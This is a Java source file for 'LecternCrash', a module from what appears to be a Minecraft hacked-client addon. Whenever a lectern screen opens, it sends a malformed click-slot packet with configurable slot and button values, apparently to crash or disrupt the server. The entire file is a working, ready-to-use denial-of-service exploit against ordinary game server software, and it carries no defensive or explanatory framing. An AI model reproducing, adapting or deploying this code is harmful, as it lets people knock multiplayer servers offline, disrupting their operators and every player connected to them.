package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.game.OpenScreenEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;

import java.util.Objects;

public class LecternCrash extends Module {

    private final Setting<Integer> slot;

    private final Setting<Integer> button;

    private final Setting<Boolean> autoDisable;

    public LecternCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Lectern Crash", "CRYSTAL || Sends broken packets while using a lectern.");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        slot = sgGeneral.add(new IntSetting.Builder()
            .name("slot")
            .description("Number of the slot")
            .defaultValue(0)
            .min(0)
            .sliderMin(0)
            .sliderMax(9)
            .build()
        );
        button = sgGeneral.add(new IntSetting.Builder()
            .name("button")
            .description("Number of the button.")
            .defaultValue(0)
            .min(0)
            .sliderMin(0)
            .sliderMax(10)
            .build()
        );
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
        );
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    @EventHandler
    private void onOpenScreenEvent(OpenScreenEvent event) {
        try {
            if (event.screen instanceof LecternScreen) {
                if (mc.player != null && mc.world != null) {
                    Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId, mc.player.currentScreenHandler.getRevision(), slot.get(), button.get(), SlotActionType.QUICK_MOVE, mc.player.currentScreenHandler.getCursorStack().copy(), Int2ObjectMaps.emptyMap()));
                    toggle();
                }
            } else {
                return;
            }

        } catch(NullPointerException NPE) {
            CrystalAddon.LOG.error("NullPointerException for LecternCrash onOpenScreenEvent: ", NPE);
        }

    }
}
